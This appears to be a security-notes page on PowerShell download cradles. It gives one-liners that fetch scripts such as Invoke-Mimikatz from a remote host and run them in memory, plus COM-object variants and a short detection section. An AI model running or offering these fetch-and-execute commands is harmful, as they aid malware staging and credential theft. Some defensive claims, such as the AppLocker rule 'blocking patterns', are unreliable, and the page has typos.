
# PowerShell Download Cradles
INIT
[Powershell](../../../coding/languages/powershell.md) download cradles are used to download and execute code *directly in memory* without it being written to disk. This helps them *bypass security* mechanisms. They're usually single-line commands and are commonly found in malware. They're typically used to implement stages of an exploit. For example, they may be used to download and run code to infiltrate additional malicious code onto a system after initial compromise. Or they might be used to set up persistence.
## Common Cmdlets
These cmdlets are commonly used in PS download cradles:
- `Invoke-WebRequest`:Used to retrieve content from a web page
- `Invoke-Expression`: (also executed using the alias `IEX`) used to execute PS commands and strings
- `System.Net.WebCleitn`: a [.NET](../../../coding/dotNET.md) class for web server interactions
## Basic Syntax
### Loading a Script into Memory
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.10.5:44444/Invoke-Mimikatz.ps1)
```
### Running the Script from Memory
```powershell
Invoke-Mimikatz -Command '"privilege::debug"'
```
## Common Download Cradle Examples
### Basic WebClient
```powershell
# Standard WebClient download cradle
IEX (New-Object Net.Webclient).downloadstring("https://example.com/script.ps1")

# PowerShell 3.0+ using Invoke-WebRequest (alias: iwr)
IEX (iwr 'https://example.com/script.ps1')
```
### COM Object Methods
```powershell
# Internet Explorer COM object
$ie = New-Object -comobject InternetExplorer.Application
$ie.visible = $False
$ie.navigate('https://example.com/script.ps1')
start-sleep -s 5
$r = $ie.Document.body.innerHTML
$ie.quit()
IEX $r

# Msxml2.XMLHTTP COM object (proxy-aware)
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','https://example.com/script.ps1',$false)
$h.send()
iex $h.responseText
```
## Detection
Modern security products use a few techniques to detect download cradles including logging, network traffic analysis, EDR, memory scanning, etc..
### `SetExecutionPolicy`
One common way organizations protect agains cradles is by restricting execution permissions using `SetExecutionPolicy`:
```powershell
# Execution Policy
Set-ExecutionPolicy Restricted
```
### AMSI
"AMSI" sandboxing (available in PowerShell 5.0+) allows admins to restrict the use of malicious commands and scripts. AMSI prevents scripts and commands from running based on their type, even if they're legitimate.

When you try to execute a command in PowerShell 5.0+, it sends the command to the *AMSI module* first which checks the command *against a set of rules*. If it finds anything malicious, it filters it out or unauthorizes the command altogether. If AMSI deems the command safe, it allows it to run.
### Blocking Download Cradle Patterns
Admins can also use `New-AppLockerPolicy` to block PS cradles from being downloaded (based on detecting common cradle characteristics):
```powershell
# AppLocker Rules
# Block PowerShell download cradle patterns
New-AppLockerPolicy -RuleType Path -Deny -Path "%SYSTEM32%\WindowsPowerShell\*\powershell.exe" -User Everyone
```


> [!Resources]
> - [Matt's DFIR blog: Download Cradles](https://mgreen27.github.io/posts/2018/downloadcradle/)
> - [BloodStiller: Understanding PowerShell Download Cradles](https://bloodstiller.com/articles/understandingdownloadcradles/)